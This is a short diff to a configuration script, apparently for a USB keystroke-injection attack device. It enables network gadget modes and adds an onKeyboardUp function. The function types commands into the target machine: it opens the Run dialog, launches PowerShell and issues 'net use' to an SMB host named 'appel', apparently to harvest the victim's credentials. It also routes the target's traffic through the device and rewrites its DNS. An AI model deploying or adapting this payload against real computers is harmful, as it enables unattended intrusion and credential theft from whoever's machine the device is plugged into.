@@ -12,7 +12,7 @@ USB_PID="0x0137"        # Product ID
 USE_ECM=true            # if true CDC ECM will be enabled
 USE_RNDIS=true          # if true RNDIS will be enabled
 USE_HID=true            # if true HID (keyboard) will be enabled
-USE_RAWHID=true         # if true HID (keyboard) will be enabled
+USE_RAWHID=false         # if true HID (keyboard) will be enabled
 USE_UMS=false 			# if true USB Mass Storage will be enabled
 
 # ==========================
@@ -29,6 +29,7 @@ IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang
 # =====================
 # Keyboard language for outhid and duckhid commands
 lang="us"
+USE_HID_TEST=false
 
 # This function gets called after the target network interface is working
 # (RNDIS, CDC ECM or both have to be enabled)
@@ -59,11 +60,42 @@ function onTargetGotIP()
 	echo "DHCP Lease given to target"
 	echo "Target IP $target_ip"
 
-        # add route back through target (for ICS)
-        route add -net default gw $target_ip
+    # add route back through target (for ICS)
+    route add -net default gw $target_ip
 
 	# add DNS entry for google DNS
 	echo nameserver 8.8.8.8 > /etc/resolv.conf
 
 	echo "Target got IP $target_ip via DHCP"
 }
+
+function onKeyboardUp()
+{
+    cat <<- EOF | duckhid
+	        DELAY 10000
+	        GUI r
+	        DELAY 500
+			STRING powershell.exe
+			ENTER
+			DELAY 2000
+	#		STRING [console]::WindowHeight=5
+	#		ENTER
+	#		STRING [console]::WindowWidth=5
+	#		ENTER
+			STRING net use \\\appel; exit;
+			ENTER
+EOF
+}
+
+function onBootFinished()
+{
+    sudo screen -d -r
+}
+
+function onLogin()
+{
+	sudo screen -d -r
+
+}
+
+
